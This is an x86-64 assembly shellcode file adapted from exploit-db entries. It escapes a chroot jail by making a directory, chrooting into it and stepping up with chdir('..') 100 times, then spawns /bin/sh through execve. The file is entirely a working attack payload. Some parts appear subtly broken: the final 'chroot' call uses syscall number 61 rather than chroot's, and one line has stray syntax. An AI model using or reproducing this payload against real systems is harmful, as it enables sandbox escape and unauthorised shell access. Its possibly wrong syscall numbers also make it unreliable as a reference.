BITS 64

;https://www.exploit-db.com/shellcodes/13577, modified for 64 bit
; mkdir("...", 0700);
push 83
pop rax, ;mkdir syscall
push byte 0x2e
push word 0x2e2e
mov rdi, rsp
mov rsi, 0700o
syscall

; chroot("...");
mov rax, 161
mov rdi, rsp
syscall 

; for (i = 100; i > 0; i--)
; {
; 	chdir("..");
; }
pop dx ; addr ".."
xor rcx, rcx
push rcx
push dx
mov cl, 100
up:
	mov rax, 80
	mov rdi, rsp
	push rcx ;preserve from clobber
	syscall
	pop rcx
loop up

; chroot(".");
mov rax, 61
xor rcx, rcx
mov [rsp + 1], cl
mov rdi, rsp
syscall

;https://www.exploit-db.com/shellcodes/38150
;execve(/bin/sh)
xor rax, rax
add rax, 59
xor rdi, rdi
push rdi
mov rdi, 0x68732F2f6e69622F
push rdi
lea rdi, [rsp]
xor rsi, rsi
xor rdx, rdx
syscall
